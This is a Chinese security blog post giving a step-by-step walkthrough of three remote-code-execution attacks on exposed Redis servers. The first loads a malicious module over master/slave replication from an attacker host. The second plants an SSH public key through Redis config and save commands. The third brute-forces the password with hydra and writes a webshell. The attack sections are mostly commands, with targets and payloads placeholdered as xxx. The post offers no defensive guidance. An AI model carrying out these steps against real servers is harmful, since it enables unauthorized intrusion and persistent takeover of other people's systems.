#  【攻防实战】Redis-RCE集锦   
原创 儒道易行  儒道易行   2025-05-31 12:01  
  
## Redis主从复制实现RCE  
### 漏洞描述  
  
Redis未授权访问在4.x/5.0.5以前版本下，我们可以使用master/slave模式加载远程模块，通过动态链接库的方式执行任意命令。  
### 漏洞实战  
  
通过  
```
redis-cli -h your-ip

```  
  
即可进行连接，可见存在未授权访问漏洞。  
```
info

```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/v94hWOZcBpy6FFL703ZLdxoT6uGpjo4086jaO9wAn2zG9qDQ1NerhFXzODGlgrGk2s9pmzbC28ibqLvBIhTbNfw/640?wx_fmt=png&from=appmsg "")  
  
编译POC即可直接执行命令  
```
make 

```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/v94hWOZcBpy6FFL703ZLdxoT6uGpjo40KtKw34KFSbBr2KticeBOxB4QseNgf8a7t61dZaWVWGsRJM2z12aroPQ/640?wx_fmt=png&from=appmsg "")  
  
当前目录下生成一个exp.so文件  
  
![](https://mmbiz.qpic.cn/mmbiz_png/v94hWOZcBpy6FFL703ZLdxoT6uGpjo407NiaRJ6nf2kMDx9sv67ohjB4UvUmLrcibCRYmnAGxhEe49BGQO0Po0fg/640?wx_fmt=png&from=appmsg "")  
  
第一个ip是目标机器，第二个ip是攻击机  
```
./xxx.py -r xxx -p 6379 -L xxx -P xxx -f xxx.so -c "whoami"

```  
  
漏洞证明  
  
![](https://mmbiz.qpic.cn/mmbiz_png/v94hWOZcBpy6FFL703ZLdxoT6uGpjo40OBRYcrias9iaERMvP9YeBibRzA2Xx4EibpwBickxU5ElBc9mRoYM14CwY3w/640?wx_fmt=png&from=appmsg "")  
  
未授权验证脚本  
  
![](https://mmbiz.qpic.cn/mmbiz_png/v94hWOZcBpy6FFL703ZLdxoT6uGpjo40ANjJKC4EGz2mJqX7eibnpWicOuRndLDv4wFFGiacTUTNxNhOqNBBeCf7w/640?wx_fmt=png&from=appmsg "")  
  
脚本运行  
```
python xxx.py xxx 6379

```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/v94hWOZcBpy6FFL703ZLdxoT6uGpjo40ibuJTYmJZSOXCGeeicL70OlDl0ntkdicorn5DnOSxlVQozfqxzQFyT9oQ/640?wx_fmt=png&from=appmsg "")  
## Redis写入SSH公钥实现RCE  
  
之前进行端口扫描时发现该机器开着6379，尝试Redis弱口令或未授权访问  
  
尝试进行连接Redis，连接成功，存在未授权访问  
```
redis-cli -h x.x.x.x
info

```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/v94hWOZcBpy6FFL703ZLdxoT6uGpjo40SxGzhOc95dQ3LvCI4U80zh21k3PapaTVPlicL544CQ0YZGshLmUAafg/640?wx_fmt=png&from=appmsg "")  
  
尝试写入SSH公钥  
  
生成ssh公钥  
```
ssh-keygen -t rsa

```  
  
将公钥导入key.txt文件(前后用\n换行，避免和Redis里其他缓存数据混合)，再把key.txt文件内容写入目标主机的redis缓冲里：  
  
将公钥导入key.txt文件  
```
(echo -e "\n\n"; cat /xxx/xxx; echo -e "\n\n") > key.txt

```  
  
把key.txt文件内容写入目标主机的redis缓冲中  
```
cat key.txt | redis-cli -h x.x.x.x -p 6379 -x set xxx

```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/v94hWOZcBpy6FFL703ZLdxoT6uGpjo407k8NGic27lrj1lXTUbAzIItBS5ltFo4j027ticp9WdEBaqfYFUyxuzVQ/640?wx_fmt=png&from=appmsg "")  
  
设置redis的备份路径  
```
config set dir /xxx

```  
  
设置保存文件名  
```
config set dbfilename xxx

```  
  
将数据保存在目标服务器硬盘上  
```
save

```  
  
退出连接  
```
exit

```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/v94hWOZcBpy6FFL703ZLdxoT6uGpjo40icxCR7CVdDLz40RGSrnWWtFAKf2AJHGE19KCszpUW5vHVu9RICGqtww/640?wx_fmt=png&from=appmsg "")  
  
连接  
```
ssh x.x.x.x

```  
  
输入私钥  
  
![](https://mmbiz.qpic.cn/mmbiz_png/v94hWOZcBpy6FFL703ZLdxoT6uGpjo40p896QEl5Ts1W09amvrlLzCuicU6fgzDqcfyIvuLwEwmce8yc1C6tM2w/640?wx_fmt=png&from=appmsg "")  
  
成功连接  
  
![](https://mmbiz.qpic.cn/mmbiz_png/v94hWOZcBpy6FFL703ZLdxoT6uGpjo40Z2AsibCmhnKHquEyqb5AicccohllfrSJUYQyMyiay6BI5NrZiaTAAWkddA/640?wx_fmt=png&from=appmsg "")  
## Redis写入webshell实现RCE  
  
通过hydra进行爆破  
```
hydra -P /xxx/xxx/xxx/xxx x.x.x.x redis 6379

```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/v94hWOZcBpy6FFL703ZLdxoT6uGpjo40s4uD160K6lURwMpH7TdIibBQxM4gFzfmsHlQ0ibGU2kQXInCwRIov5hg/640?wx_fmt=png&from=appmsg "")  
  
连接redis  
```
redis-cli -h x.x.x.x -a xxx

```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/v94hWOZcBpy6FFL703ZLdxoT6uGpjo40gzW246Da0sTKFl4esH9UYldGgBsGmNpBXRY0xBoA7B4d3oTzorGaRg/640?wx_fmt=png&from=appmsg "")  
  
备份文件写Shell  
  
进入默认目录  
```
config set dir "xxx" 

```  
  
创建文件  
```
config set dbfilename "xxx" 

```  
  
写入webshell  
```
set x "xxx"

```  
  
最后保存  
```
save

```  
  
利用过程  
  
![](https://mmbiz.qpic.cn/mmbiz_png/v94hWOZcBpy6FFL703ZLdxoT6uGpjo40dFUQHxib29OZ9Hrr4iciceoFjUgrC83n7Mvzup3lKGp48HRr5K8ruiatNA/640?wx_fmt=png&from=appmsg "")  
  
成功连接到server-redis  
  
![](https://mmbiz.qpic.cn/mmbiz_png/v94hWOZcBpy6FFL703ZLdxoT6uGpjo40310nia4ia9Yvm1ER17emIZibsJrLZ7sEPMvzOLuiaCVYZLrwsNndYf9Jaw/640?wx_fmt=png&from=appmsg "")  
## 攻防交流群  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/v94hWOZcBpy6FFL703ZLdxoT6uGpjo40MVMVxMtP5MicX1GkkRHicibNoaL6h2uCJy4hluz9oUgukD2icGIYe5sI8A/640?wx_fmt=jpeg&from=appmsg "")  
## 声明  
  
文笔生疏，措辞浅薄，敬请各位大佬不吝赐教，万分感谢。  
  
免责声明：由于传播或利用此文所提供的信息、技术或方法而造成的任何直接或间接的后果及损失，均由使用者本人负责， 文章作者不为此承担任何责任。  
  
转载声明：儒道易行 拥有对此文章的修改和解释权，如欲转载或传播此文章，必须保证此文章的完整性，包括版权声明等全部内容。未经作者允许，不得任意修改或者增减此文章的内容，不得以任何方式将其用于商业目的。  
  
